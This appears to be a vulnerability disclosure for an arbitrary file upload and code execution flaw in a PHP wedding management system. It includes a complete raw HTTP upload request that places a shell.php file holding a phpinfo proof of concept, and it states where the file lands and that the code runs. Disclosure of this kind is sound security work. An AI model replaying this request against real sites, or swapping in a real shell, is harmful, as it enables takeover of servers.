# Wedding Management System v1.0 by codeastr.com has arbitrary code execution (RCE)

vendor: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability url: http://ip/Wedding-Management/admin/blog_events_edit.php?id=31

Loophole location：There is an arbitrary file upload vulnerability (RCE) in the picture upload point of the "blog_events_edit.php" file of the "blog&events" module in the background management system

Request package for file upload：

```sql
POST /Wedding-Management/admin/blog_events_edit.php?id=31 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/Wedding-Management/admin/blog_events_edit.php?id=31
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------341485402087
Content-Length: 1083

-----------------------------341485402087
Content-Disposition: form-data; name="submit"


-----------------------------341485402087
Content-Disposition: form-data; name="wedding_type"

Elite
-----------------------------341485402087
Content-Disposition: form-data; name="title"

MR. & MRS. Atwood
-----------------------------341485402087
Content-Disposition: form-data; name="description"

92-acre Tuscan-inspired estate offering indoor and outdoor event spaces, as well as a Four Diamond inn and renowned restaurant.
-----------------------------341485402087
Content-Disposition: form-data; name="preview_image"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------341485402087
Content-Disposition: form-data; name="wedding_date"

03/24/2022
-----------------------------341485402087
Content-Disposition: form-data; name="location"

Vintners Resort
-----------------------------341485402087
Content-Disposition: form-data; name="status"

1
-----------------------------341485402087--
```

The files will be uploaded to this directory \admin\upload\events\

![image](https://user-images.githubusercontent.com/54017627/167978399-9f9e1634-fe87-4af3-aac5-b97bcc255535.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/167978515-e6e8a140-c010-4d75-82d9-8271832c4d8c.png)


